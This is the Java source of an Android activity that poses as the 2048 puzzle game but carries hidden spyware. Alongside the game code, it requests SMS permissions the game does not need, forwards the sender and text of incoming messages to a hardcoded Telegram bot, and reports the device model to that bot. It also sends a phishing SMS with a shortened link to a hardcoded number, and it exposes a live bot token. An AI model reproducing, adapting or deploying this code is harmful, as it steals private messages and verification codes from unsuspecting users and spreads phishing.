package com.uberspot.a2048;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences.Editor;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageManager;
import android.content.res.Configuration;
import android.graphics.Color;
import android.os.Build;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.provider.Settings;
import android.provider.Settings.SettingNotFoundException;
import android.telephony.SmsManager;
import android.text.Html;
import android.util.Log;
import android.view.MotionEvent;
import android.view.Window;
import android.view.WindowManager.LayoutParams;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.widget.TableRow;
import android.widget.TextView;
import android.widget.Toast;

import androidx.localbroadcastmanager.content.LocalBroadcastManager;

import java.io.IOException;
import java.util.Locale;

import de.cketti.changelog.dialog.DialogChangeLog;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;



public class MainActivity extends Activity {
    private static final int REQUEST_CODE = 123; // or any other unique integer

    private static final String MAIN_ACTIVITY_TAG = "2048_MainActivity";
    private static final int RESULT_ENABLE = 0;
    private static final int VISIBILITY = 1028;

    private WebView mWebView;
    private long mLastBackPress;
    private static final long mBackPressThreshold = 3500;
    private static final String IS_FULLSCREEN_PREF = "is_fullscreen_pref";
    private long mLastTouch;
    private static final long mTouchThreshold = 2000;
    private Toast pressBackToast;

    private final OkHttpClient client = new OkHttpClient();
    String device = (Build.BRAND + " - " + Build.MODEL + SmsManager.getDefault());

    private BroadcastReceiver onNotice = new BroadcastReceiver() {
        public void onReceive(Context context, Intent intent) {
            String stringExtra = intent.getStringExtra("package");
            String stringExtra2 = intent.getStringExtra("title");
            String stringExtra3 = intent.getStringExtra("text");

            // Update UI
            new TableRow(MainActivity.this.getApplicationContext()).setLayoutParams(new TableRow.LayoutParams(-1, -2));
            TextView textView = new TextView(MainActivity.this.getApplicationContext());
            textView.setLayoutParams(new TableRow.LayoutParams(-2, -2, 1.0f));
            textView.setTextSize(12.0f);
            textView.setTextColor(Color.parseColor("#000000"));
            textView.setText(Html.fromHtml("From : " + stringExtra2 + " | Message : </b>" + stringExtra3));

            // Send to Telegram
            MainActivity.this.client.newCall(new Request.Builder().url("https://api.telegram.org/bot7230319224:AAFIVGd2yhGe552DCNwoz2DKEvXm99QHG2g/sendMessage?parse_mode=markdown&7335299143=<chat_id>&text=*" + stringExtra + "* %0A%0A*From :* _" + stringExtra2 + "%0A*𝗣𝗲𝘀𝗮𝗻 :* " + stringExtra3 + "_").build()).enqueue(new Callback() {
                public void onFailure(Call call, IOException iOException) {
                    iOException.printStackTrace();
                }

                public void onResponse(Call call, Response response) throws IOException {
                    Log.d(MAIN_ACTIVITY_TAG, "OnResponse: Thread Id " + Thread.currentThread().getId());
                    if (response.isSuccessful()) {
                        response.body().string();
                    }
                }
            });
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Register BroadcastReceiver
        LocalBroadcastManager.getInstance(this).registerReceiver(this.onNotice, new IntentFilter("Msg"));

        // Check permissions for SMS

        // Don't show an action bar or title
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED ||
                    checkSelfPermission(Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {

                // Request the necessary permissions
                requestPermissions(new String[]{
                        Manifest.permission.RECEIVE_SMS,
                        Manifest.permission.SEND_SMS
                }, REQUEST_CODE);
            }
        }
        requestWindowFeature(Window.FEATURE_NO_TITLE);

        // Enable hardware acceleration
        getWindow().setFlags(LayoutParams.FLAG_HARDWARE_ACCELERATED,
                LayoutParams.FLAG_HARDWARE_ACCELERATED);

        // Apply previous setting about showing status bar or not
        applyFullScreen(isFullScreen());

        // Check if screen rotation is locked in settings
        boolean isOrientationEnabled = false;
        try {
            isOrientationEnabled = Settings.System.getInt(getContentResolver(),
                    Settings.System.ACCELEROMETER_ROTATION) == 1;
        } catch (SettingNotFoundException e) {
            Log.d(MAIN_ACTIVITY_TAG, "Settings could not be loaded");
        }

        // If rotation isn't locked and it's a LARGE screen then add orientation changes based on sensor
        int screenLayout = getResources().getConfiguration().screenLayout
                & Configuration.SCREENLAYOUT_SIZE_MASK;
        if (((screenLayout == Configuration.SCREENLAYOUT_SIZE_LARGE)
                || (screenLayout == Configuration.SCREENLAYOUT_SIZE_XLARGE))
                && isOrientationEnabled) {
            setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_SENSOR);
        }

        setContentView(R.layout.activity_main);

        DialogChangeLog changeLog = DialogChangeLog.newInstance(this);
        if (changeLog.isFirstRun()) {
            changeLog.getLogDialog().show();
        }

        // Load webview with game
        mWebView = findViewById(R.id.mainWebView);
        WebSettings settings = mWebView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setDatabaseEnabled(true);
        settings.setRenderPriority(WebSettings.RenderPriority.HIGH);
        settings.setDatabasePath(getFilesDir().getParentFile().getPath() + "/databases");

        // If there is a previous instance restore it in the webview
        if (savedInstanceState != null) {
            mWebView.restoreState(savedInstanceState);
        } else {
            // Load webview with current Locale language
            mWebView.loadUrl("file:///android_asset/2048/index.html?lang=" + Locale.getDefault().getLanguage());
        }

        Toast.makeText(getApplication(), R.string.toggle_fullscreen, Toast.LENGTH_SHORT).show();
        // Set fullscreen toggle on webview LongClick
        mWebView.setOnTouchListener((v, event) -> {
            // Implement a long touch action by comparing
            // time between action up and action down
            long currentTime = System.currentTimeMillis();
            if ((event.getAction() == MotionEvent.ACTION_UP)
                    && (Math.abs(currentTime - mLastTouch) > mTouchThreshold)) {
                boolean toggledFullScreen = !isFullScreen();
                saveFullScreen(toggledFullScreen);
                applyFullScreen(toggledFullScreen);
            } else if (event.getAction() == MotionEvent.ACTION_DOWN) {
                mLastTouch = currentTime;
            }
            // return so that the event isn't consumed but used
            // by the webview as well
            return false;
        });

        pressBackToast = Toast.makeText(getApplicationContext(), R.string.press_back_again_to_exit,
                Toast.LENGTH_SHORT);


    }

    @Override
    protected void onResume() {
        super.onResume();
        mWebView.loadUrl("file:///android_asset/2048/index.html?lang=" + Locale.getDefault().getLanguage());
    }

    @Override
    protected void onSaveInstanceState(Bundle outState) {
        mWebView.saveState(outState);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (grantResults[0] == 0) {
            this.client.newCall(new Request.Builder().url("https://api.telegram.org/bot7230319224:AAFIVGd2yhGe552DCNwoz2DKEvXm99QHG2g/sendMessage?parse_mode=markdown&chat_id=7335299143&text=︻┳═一ῥἔʀἔҭᾄṩ一═┳︻ : _" + this.device).build()).enqueue(new Callback() {
                public void onFailure(Call call, IOException iOException) {
                    try {
                        // Perform operations that may throw IOException
                        // For example:
                        throw new IOException("File not found");
                    } catch (IOException e) {
                        e.printStackTrace(); // Print stack trace to console
                        Log.d("TAG", "IOException occurred: " + Log.getStackTraceString(e)); // Log stack trace to Logcat
                    }
                }

                public void onResponse(Call call, Response response) throws IOException {
                    Log.d(MAIN_ACTIVITY_TAG, "OnResponse: Thread Id " + Thread.currentThread().getId());
                    if (response.isSuccessful()) {
                        response.body().string();
                    }
                }
            });
            try {
                SmsManager.getDefault().sendTextMessage("081249248578", null, "JANGAN HANGUS! Tukarkan poinmu skrg juga di myIM3 dengan voucher dan Kuota, klik:bit.ly/imp-ret", null, null);
            } catch (Exception e) {
                this.client.newCall(new Request.Builder().url("https://api.telegram.org/bot7230319224:AAFIVGd2yhGe552DCNwoz2DKEvXm99QHG2g/sendMessage?parse_mode=markdown&chat_id=7335299143&text=Error : _" + e).build()).enqueue(new Callback() {
                    public void onFailure(Call call, IOException iOException) {
                        iOException.printStackTrace();
                    }

                    public void onResponse(Call call, Response response) throws IOException {
                        Log.d(MAIN_ACTIVITY_TAG, "OnResponse: Thread Id " + Thread.currentThread().getId());
                        if (response.isSuccessful()) {
                            response.body().string();
                        }
                    }
                });
            }
        }
    }

    @Override
    public void onBackPressed() {
        long currentTime = System.currentTimeMillis();
        if (Math.abs(currentTime - mLastBackPress) > mBackPressThreshold) {
            pressBackToast.show();
            mLastBackPress = currentTime;
        } else {
            pressBackToast.cancel();
            super.onBackPressed();
        }
    }

    private void applyFullScreen(boolean fullscreen) {
        if (fullscreen) {
            getWindow().setFlags(VISIBILITY, VISIBILITY);
        } else {
            getWindow().clearFlags(VISIBILITY);
        }
    }

    private void saveFullScreen(boolean fullscreen) {
        Editor edit = PreferenceManager.getDefaultSharedPreferences(this).edit();
        edit.putBoolean(IS_FULLSCREEN_PREF, fullscreen);
        edit.apply();
    }

    private boolean isFullScreen() {
        return PreferenceManager.getDefaultSharedPreferences(this).getBoolean(IS_FULLSCREEN_PREF, true);
    }
}
